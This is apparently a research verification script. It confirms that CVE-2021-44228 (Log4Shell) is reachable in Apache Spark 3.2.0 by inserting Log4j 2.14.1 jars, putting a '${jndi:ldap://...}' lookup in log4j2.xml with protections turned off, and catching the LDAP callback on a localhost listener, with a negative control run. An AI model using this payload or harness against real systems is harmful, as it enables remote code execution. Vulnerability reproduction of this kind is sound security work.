#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_spark_3_2_0_v1_log4j_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SPARK_ARCHIVE = LEGACY_ROOT / "historical-scan" / "spark-3.2.0-bin-without-hadoop.tgz"
HADOOP_ARCHIVE = LEGACY_ROOT / "historical-scan" / "hadoop-3.3.4.tar.gz"
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
V1_LOG4J_API = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar")
V1_LOG4J_CORE = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar")
AUX_DIR = LEGACY_ROOT / "historical-scan" / "maven-log4j-2.14.1"
AUX_LOG4J_SLF4J = AUX_DIR / "log4j-slf4j-impl-2.14.1.jar"
AUX_LOG4J_12 = AUX_DIR / "log4j-1.2-api-2.14.1.jar"
AUX_SLF4J_API = Path("/data/lhq/workspace/ljl-strict-redo/probes/CVE-2023-26049__apache__hadoop/runtime/hadoop-3.3.4/share/hadoop/common/lib/slf4j-api-1.7.36.jar")
JAVA8 = Path("/data/lhq/.sdkman/candidates/java/8.0.452-amzn")
SPARK_DIST = "spark-3.2.0-bin-without-hadoop"


def sha256(path):
    digest = hashlib.sha256()
    with Path(path).open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_log4j_core(jar_path):
    jar_path = Path(jar_path)
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "version_2_14_1": False,
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            text = zf.read(props).decode("utf-8", "replace")
            result["version_2_14_1"] = "version=2.14.1" in text
            result["pom_properties"] = text
    return result


def start_ldap_listener(evidence_dir, case_name, timeout=15):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-ldap-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"LDAP listener did not start for {case_name}")
    return port_box["port"], received, thread


def copy_with_meta(src, dst, generated):
    if not src.exists():
        raise FileNotFoundError(src)
    shutil.copy2(src, dst)
    return {
        "source": str(src),
        "target": str(dst),
        "sha256_source": sha256(src),
        "sha256_target": sha256(dst),
        "is_generated_v1_runtime_jar": generated,
    }


def log4j2_xml(value):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="trace">
  <Properties>
    <Property name="strictLookup">{value}</Property>
  </Properties>
  <Appenders>
    <Console name="Console" target="SYSTEM_ERR">
      <PatternLayout pattern="%d %p %c - %m %X{{strictLookup}}%n"/>
    </Console>
  </Appenders>
  <Loggers>
    <Root level="info">
      <AppenderRef ref="Console"/>
    </Root>
  </Loggers>
</Configuration>
"""


def extract_distribution(sample_dir, case_name):
    if not SPARK_ARCHIVE.exists():
        raise FileNotFoundError(SPARK_ARCHIVE)
    if not HADOOP_ARCHIVE.exists():
        raise FileNotFoundError(HADOOP_ARCHIVE)
    run_root = sample_dir / f"{case_name}-runtime"
    if run_root.exists():
        shutil.rmtree(run_root)
    run_root.mkdir(parents=True)
    with tarfile.open(SPARK_ARCHIVE, "r:gz") as tar:
        tar.extractall(run_root)
    with tarfile.open(HADOOP_ARCHIVE, "r:gz") as tar:
        members = [
            m for m in tar.getmembers()
            if m.name.endswith("/share/hadoop/client/hadoop-client-api-3.3.4.jar")
            or m.name.endswith("/share/hadoop/client/hadoop-client-runtime-3.3.4.jar")
        ]
        tar.extractall(run_root / "hadoop-client", members=members)
    dist = run_root / SPARK_DIST
    if not dist.exists():
        raise FileNotFoundError(dist)
    for script in (dist / "bin").glob("*"):
        if script.is_file():
            script.chmod(script.stat().st_mode | 0o111)
    return dist, run_root


def insert_v1_log4j(dist, run_root):
    jars_dir = dist / "jars"
    before = sorted(p.name for p in jars_dir.glob("*log4j*.jar")) + sorted(p.name for p in jars_dir.glob("slf4j*.jar"))
    inserted = {
        "log4j-api-2.14.1.jar": copy_with_meta(V1_LOG4J_API, jars_dir / "log4j-api-2.14.1.jar", True),
        "log4j-core-2.14.1.jar": copy_with_meta(V1_LOG4J_CORE, jars_dir / "log4j-core-2.14.1.jar", True),
    }
    auxiliary = {
        "log4j-slf4j-impl-2.14.1.jar": copy_with_meta(AUX_LOG4J_SLF4J, jars_dir / "log4j-slf4j-impl-2.14.1.jar", False),
        "log4j-1.2-api-2.14.1.jar": copy_with_meta(AUX_LOG4J_12, jars_dir / "log4j-1.2-api-2.14.1.jar", False),
        "slf4j-api-1.7.36.jar": copy_with_meta(AUX_SLF4J_API, jars_dir / "slf4j-api-1.7.36.jar", False),
    }
    for src in sorted((run_root / "hadoop-client").rglob("hadoop-client-*.jar")):
        auxiliary[src.name] = copy_with_meta(src, jars_dir / src.name, False)
    core_target = jars_dir / "log4j-core-2.14.1.jar"
    inserted["log4j-core-2.14.1.jar"]["inspection_after"] = inspect_log4j_core(core_target)
    after = sorted(p.name for p in jars_dir.glob("*log4j*.jar")) + sorted(p.name for p in jars_dir.glob("slf4j*.jar"))
    return {
        "artifact": str(SPARK_ARCHIVE),
        "auxiliary_hadoop_artifact": str(HADOOP_ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_method": (
            "isolated runtime dependency insertion: official Apache Spark 3.2.0 without-Hadoop "
            "binary with generated v1 Log4j 2.14.1 api/core jar bytes copied from .m2-poc into "
            "Spark's jars directory before invoking the real bin/spark-submit entrypoint; Hadoop "
            "client and logging bridge jars are auxiliary compatibility dependencies"
        ),
        "runtime_logging_jars_before_insertion": before,
        "inserted_v1_jars": inserted,
        "inserted_auxiliary_jars": auxiliary,
        "runtime_logging_jars_after_insertion": after,
    }


def write_dependency_evidence(evidence_dir, dependency_evidence):
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(dependency_evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    lines = []
    for key, meta in dependency_evidence["inserted_v1_jars"].items():
        lines.append(f"v1\t{key}\t{meta['sha256_target']}")
    for key, meta in dependency_evidence["inserted_auxiliary_jars"].items():
        lines.append(f"aux\t{key}\t{meta['sha256_target']}")
    (evidence_dir / "dependency-evidence.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")


def exercise_spark(sample_dir, evidence_dir, case_name, location_factory):
    port, received, thread = start_ldap_listener(evidence_dir, case_name)
    location = location_factory(port)
    dist, run_root = extract_distribution(sample_dir, case_name)
    dependency_evidence = insert_v1_log4j(dist, run_root)
    config = dist / "conf" / "log4j2.xml"
    config.write_text(log4j2_xml(location), encoding="utf-8")
    (evidence_dir / f"{case_name}-log4j2.xml").write_text(config.read_text(encoding="utf-8"), encoding="utf-8")

    cmd = [
        str(dist / "bin" / "spark-submit"),
        "--master", "local[1]",
        "--class", "org.apache.spark.examples.SparkPi",
        str(dist / "examples" / "jars" / "spark-examples_2.12-3.2.0.jar"),
        "1",
    ]
    env = os.environ.copy()
    env["JAVA_TOOL_OPTIONS"] = "-Dlog4j2.formatMsgNoLookups=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=true"
    env["SPARK_PRINT_LAUNCH_COMMAND"] = "1"
    env["SPARK_LOCAL_IP"] = "127.0.0.1"
    env["SPARK_SUBMIT_OPTS"] = f"-Dlog4j.configurationFile={config}"
    if JAVA8.exists():
        env["JAVA_HOME"] = str(JAVA8)
        env["PATH"] = str(JAVA8 / "bin") + ":" + env.get("PATH", "")

    started = time.time()
    proc = subprocess.run(
        cmd,
        cwd=str(dist),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=45,
    )
    thread.join(15)
    output = proc.stdout
    result = {
        "case": case_name,
        "entrypoint": "bin/spark-submit --master local[1] --class org.apache.spark.examples.SparkPi",
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "log4j_configuration_file": str(config),
        "config_lookup_value": location,
        "listener_received_count": len(received),
        "listener_received": received,
        "returncode": proc.returncode,
        "java_home": env.get("JAVA_HOME"),
        "contains_sparkpi": "Pi is roughly" in output,
        "contains_config_value": location in output,
        "contains_jndi_text": "jndi" in output.lower() or "javax.naming" in output,
        "stdout_tail": output[-12000:],
        "dependency_evidence": dependency_evidence,
    }
    (evidence_dir / f"{case_name}.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return result, dependency_evidence


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    root = Path(args.workdir)
    sample_dir = root / "samples" / SAMPLE_ID
    if args.fresh and sample_dir.exists():
        shutil.rmtree(sample_dir)
    evidence_dir = sample_dir / "evidence"
    evidence_dir.mkdir(parents=True, exist_ok=True)

    positive, dependency_evidence = exercise_spark(
        sample_dir,
        evidence_dir,
        "positive",
        lambda port: f"${{jndi:ldap://127.0.0.1:{port}/a}}",
    )
    write_dependency_evidence(evidence_dir, dependency_evidence)
    negative, _ = exercise_spark(
        sample_dir,
        evidence_dir,
        "negative",
        lambda port: "strict-control-no-jndi",
    )

    inserted_core = dependency_evidence["inserted_v1_jars"]["log4j-core-2.14.1.jar"]
    inspection = inserted_core["inspection_after"]
    confirmed = (
        positive["returncode"] == 0
        and negative["returncode"] == 0
        and positive["contains_sparkpi"]
        and negative["contains_sparkpi"]
        and positive["listener_received_count"] > 0
        and negative["listener_received_count"] == 0
        and inspection["version_2_14_1"]
        and inspection["jndi_lookup_class_present"]
        and inspection["jndi_manager_class_present"]
        and inserted_core["sha256_source"] == inserted_core["sha256_target"]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "downstream_repo": "apache/spark",
        "downstream_application": "Apache Spark 3.2.0 spark-submit",
        "downstream_entrypoint": "bin/spark-submit --master local[1] --class org.apache.spark.examples.SparkPi",
        "downstream": "Apache Spark 3.2.0",
        "attack_surface": (
            "Spark's real spark-submit launcher loads a Log4j2 configuration file through "
            "SPARK_SUBMIT_OPTS before running SparkPi; the inserted v1 Log4j core resolves "
            "a JNDI lookup in the configuration path while the negative control uses the same "
            "entrypoint with a non-JNDI value"
        ),
        "cve": "CVE-2021-44228",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(SPARK_ARCHIVE),
        "auxiliary_artifact": str(HADOOP_ARCHIVE),
        "dependency_evidence": dependency_evidence,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(root / "scripts" / "verify_spark_log4j_v1_inserted.py"),
        "payload": positive["config_lookup_value"],
        "positive": positive,
        "negative": negative,
        "dynamic_signal": {
            "positive_listener_received_count": positive["listener_received_count"],
            "positive_listener_received": positive["listener_received"],
            "positive_sparkpi": positive["contains_sparkpi"],
            "negative_listener_received_count": negative["listener_received_count"],
            "negative_listener_received": negative["listener_received"],
            "negative_sparkpi": negative["contains_sparkpi"],
        },
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts the generated v1 Log4j "
            "api/core 2.14.1 runtime jar bytes into an isolated Apache Spark 3.2.0 distribution, "
            "adds only auxiliary Hadoop/logging bridge jars needed for the without-Hadoop binary "
            "to run SparkPi, and triggers Log4Shell through Spark's real spark-submit startup "
            "and Log4j2 configuration loading path. The positive run receives an LDAP connection; "
            "the negative control receives none."
        ),
    }

    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    listener_hex = positive["listener_received"][0].get("data_hex", "") if positive["listener_received"] else ""
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_returncode={positive['returncode']}\n"
        f"positive_sparkpi_observed={int(positive['contains_sparkpi'])}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"listener_data_hex={listener_hex}\n"
        f"negative_returncode={negative['returncode']}\n"
        f"negative_sparkpi_observed={int(negative['contains_sparkpi'])}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n"
        f"jndi_lookup_class_present={int(inspection['jndi_lookup_class_present'])}\n"
        f"jndi_manager_class_present={int(inspection['jndi_manager_class_present'])}\n"
        f"log4j_core_version_2_14_1={int(inspection['version_2_14_1'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Spark "
        "3.2.0 without-Hadoop binary into isolated runtimes, copies the generated v1 Log4j "
        "2.14.1 api/core jars into Spark's runtime `jars/` directory, adds only auxiliary "
        "Hadoop and logging bridge jars needed for the real `spark-submit` entrypoint to run, "
        "writes `conf/log4j2.xml`, and executes SparkPi through `bin/spark-submit`.\n\n"
        "The positive run puts a JNDI lookup in the Log4j2 configuration value and receives "
        "an LDAP connection. The negative run uses the same downstream startup path with a "
        "non-JNDI value and receives no callback.\n\n"
        "Run: `python3 scripts/verify_spark_log4j_v1_inserted.py --fresh` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )

    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
